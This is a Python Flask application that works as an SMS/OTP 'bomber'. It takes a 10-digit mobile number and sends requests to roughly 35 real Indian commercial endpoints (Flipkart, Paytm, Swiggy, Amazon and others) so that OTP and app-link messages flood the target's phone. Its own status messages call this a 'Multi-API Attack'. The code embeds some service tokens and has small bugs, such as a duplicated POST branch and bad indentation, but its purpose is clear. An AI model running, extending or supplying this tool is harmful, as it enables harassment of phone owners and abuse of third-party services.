import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*"
    }
     apis = [
    {
        "name": "confirmtkt",
        "method": "POST",
        "url": "https://securedapi.confirmtkt.com/api/platform/register",
        "data": {"newOtp": "true", "mobileNumber": mobile},
    },
    {
        "name": "justdial",
        "method": "POST",
        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
        "data": {"mobile": mobile},
    },
    {
        "name": "allensolly",
        "method": "POST",
        "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        "data": {"mobileoremail": mobile, "name": "markluther"},
    },
    {
        "name": "frotels",
        "method": "POST",
        "url": "https://www.frotels.com/appsendsms.php",
        "data": {"mobno": mobile},
    },
    {
        "name": "gapoon",
        "method": "POST",
        "url": "https://www.gapoon.com/userSignup",
        "data": {"mobile": mobile, "email": "noreply@gmail.com", "name": "LexLuthor"},
    },
    {
        "name": "housing",
        "method": "POST",
        "url": "https://login.housing.com/api/v2/send-otp",
        "data": {"phone": mobile},
    },
    {
        "name": "porter",
        "method": "POST",
        "url": "https://porter.in/restservice/send_app_link_sms",
        "data": {"phone": mobile, "referrer_string": "", "brand": "porter"},
    },
    {
        "name": "cityflo",
        "method": "POST",
        "url": "https://cityflo.com/website-app-download-link-sms/",
        "data": {"mobile_number": mobile},
    },
    {
        "name": "nnnow",
        "method": "POST",
        "url": "https://api.nnnow.com/d/api/appDownloadLink",
        "data": {"mobileNumber": mobile},
    },
    {
        "name": "ajio",
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "data": {
            "firstName": "xxps",
            "login": "wiqpdl223@wqew.com",
            "password": "QASpw@1s",
            "genderType": "Male",
            "mobileNumber": mobile,
            "requestType": "SENDOTP",
        },
    },
    {
        "name": "happyeasygo",
        "method": "POST",
        "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
        "data": {"phone": mobile},
    },
    {
        "name": "unacademy",
        "method": "POST",
        "url": "https://unacademy.com/api/v1/user/get_app_link/",
        "data": {"phone": mobile},
    },
    {
        "name": "treebo",
        "method": "POST",
        "url": "https://www.treebo.com/api/v2/auth/login/otp/",
        "data": {"phone_number": mobile},
    },
    {
        "name": "airtel",
        "method": "POST",
        "url": "https://www.airtel.in/referral-api/core/notify",
        "data": {"messageId": "map", "rtn": mobile},
    },
    {
        "name": "pharmeasy",
        "method": "POST",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "data": {"contactNumber": mobile},
    },
    {
        "name": "mylescars",
        "method": "POST",
        "url": "https://www.mylescars.com/usermanagements/chkContact",
        "data": {"contactNo": mobile},
    },
    {
        "name": "grofers",
        "method": "POST",
        "url": "https://grofers.com/v2/accounts/",
        "data": {"user_phone": mobile},
        "headers": {
            "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
        },
    },
    {
        "name": "dream11",
        "method": "POST",
        "url": "https://api.dream11.com/sendsmslink",
        "data": {"siteId": "1", "mobileNum": mobile, "appType": "androidfull"},
    },
    {
        "name": "cashify",
        "method": "POST",
        "url": "https://www.cashify.in/api/cu01/v1/app-link",
        "data": {"mn": mobile},
    },
    {
        "name": "paytm",
        "method": "POST",
        "url": "https://commonfront.paytm.com/v4/api/sendsms",
        "data": {"phone": mobile, "guid": "2952fa812660c58dc160ca6c9894221d"},
    },
    {
        "name": "kfc-in",
        "method": "POST",
        "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
        "data": {"AuthorizedFor": "3", "phoneNumber": mobile, "Resend": "false"},
        "headers": {
            "Referer": "https://online.kfc.co.in/login",
            "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01",
        },
    },
    {
        "name": "indialends",
        "method": "POST",
        "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        "data": {
            "aeyder03teaeare": "1",
            "ertysvfj74sje": "91",
            "jfsdfu14hkgertd": mobile,
            "lj80gertdfg": "0",
        },
        "headers": {"Referer": "https://indialends.com/personal-loan"},
    },
    {
        "name": "flipkart",
        "method": "POST",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "data": {"loginId": f"+91{mobile}"},
        "headers": {
            "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            "Origin": "https://www.flipkart.com",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    },
    {
        "name": "redbus",
        "method": "POST",
        "url": "https://m.redbus.in/api/getOtp",
        "data": {"number": mobile, "cc": "91", "whatsAppOpted": False},
    },
    {
        "name": "swiggy",
        "method": "POST",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "data": {"mobile": mobile},
    },
    {
        "name": "zomato",
        "method": "POST",
        "url": "https://www.zomato.com/php/oauth_otp.php",
        "data": {"phone": mobile, "otp_via": "whatsapp"},
    },
    {
        "name": "bigbasket",
        "method": "POST",
        "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/send/",
        "data": {"phone": mobile, "channel": "sms"},
    },
    {
        "name": "amazon",
        "method": "POST",
        "url": "https://www.amazon.in/ap/signin",
        "data": {"email": mobile, "create": "0"},
    },
    {
        "name": "myntra",
        "method": "POST",
        "url": "https://www.myntra.com/otp/generate",
        "data": {"phone": mobile},
    },
    {
        "name": "snapdeal",
        "method": "POST",
        "url": "https://www.snapdeal.com/authenticate/emailOrMobile",
        "data": {"mobile": mobile, "checkUser": "1"},
    },
    {
        "name": "ola",
        "method": "POST",
        "url": "https://api.olacabs.com/v1/oauth/otp",
        "data": {"phone": mobile},
    },
    {
        "name": "uber",
        "method": "POST",
        "url": "https://auth.uber.com/v2/oauth/token",
        "data": {
            "client_id": "eCAbBp7pFFl4kVJwyvjq1xdWfpeJyu1d",
            "phone": mobile,
            "scope": "eats.order",
        },
    },
    {
        "name": "rapido",
        "method": "POST",
        "url": "https://rapido.bike/Customer/authenticate",
        "data": {"phone": mobile},
    },
    {
        "name": "dominos",
        "method": "POST",
        "url": "https://order.godominos.co.in/Online/Verification.aspx/SendOTP",
        "data": {"MobileNo": mobile},
    },
    {
        "name": "pizzahut",
        "method": "POST",
        "url": "https://www.pizzahut.co.in/account/sendotp",
        "data": {"mobile": mobile, "email": "test@example.com"},
    },
]
    for api in apis:
        try:
            if api["method"] == "POST":
                session.post(api["url"], json=api["data"])
            elif api["method"] == "POST":
                session.get(api["url"])
        except:
            pass
            
    print(f"Round {count} Finished.")
    count += 1
    time.sleep(1)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": f"Multi-API Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)